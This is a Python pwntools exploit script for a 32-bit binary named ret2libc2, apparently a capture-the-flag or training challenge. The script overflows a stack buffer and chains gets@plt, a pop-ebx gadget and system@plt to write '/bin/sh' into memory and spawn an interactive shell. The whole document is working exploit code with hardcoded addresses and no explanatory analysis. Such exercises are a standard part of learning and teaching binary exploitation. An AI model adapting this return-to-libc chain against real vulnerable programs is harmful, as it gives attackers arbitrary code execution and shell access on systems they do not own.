#!/usr/bin/env python3
from pwn import *

# Addresses need to be confirmed and replaced with the correct ones
gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx_ret_addr = 0x0804843d
buf2_addr = 0x0804a080
offset = 0x6c + 4

# Create the process to interact with
sh = process('./ret2libc2')

# Construct the payload
payload = flat([
    b'A' * offset,         # Filler data to reach the return address
    gets_plt,             # Address of gets@plt
    pop_ebx_ret_addr,     # Address to pop value into ebx (to control it for gets@plt)
    buf2_addr,            # Argument for gets (where to write '/bin/sh')
    system_plt,           # Address of system@plt
    0xdeadbeef,
    buf2_addr             # Argument for system (pointer to '/bin/sh')
])

# Send the payload to the process
sh.sendline(payload)
sh.sendline('/bin/sh')  # Send the string '/bin/sh' to gets() function
sh.interactive()         # Give control to the user
